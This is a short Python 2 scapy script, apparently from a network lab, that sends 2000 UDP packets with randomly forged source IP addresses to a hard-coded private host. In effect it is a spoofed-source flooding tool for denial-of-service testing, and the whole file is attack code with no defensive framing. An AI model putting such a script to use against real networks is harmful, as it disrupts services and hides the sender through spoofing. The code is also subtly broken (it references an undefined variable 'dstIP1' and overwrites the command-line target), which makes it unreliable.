#!/usr/bin/env python
import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange


def sourceIPgen():
    not_valid = [10,127,254,255,1,2,169,172,192]
    first = randrange(1,256)
    while first in not_valid:
        first = randrange(1,256)
        
    ip =".".join([str(first),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
    print ip
    return ip


def main():
    
    dstIP = sys.argv[1:]    
    dstIP="10.0.0.8"
    print dstIP
    
    src_port = 80
    dst_port = 1    
    
    interface = popen('ifconfig | awk \'/eth0/ {print$1}\'').read()
    print (repr(interface))
 
    for i in xrange(0,2000):
        # form the packet
        packets =Ether()/IP(dst=dstIP1,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
        print(repr(packets))    
        sendp( packets, iface=interface.rstrip(), inter=0.08)
    
    
        
if __name__=="__main__":
    main()      
           
    
        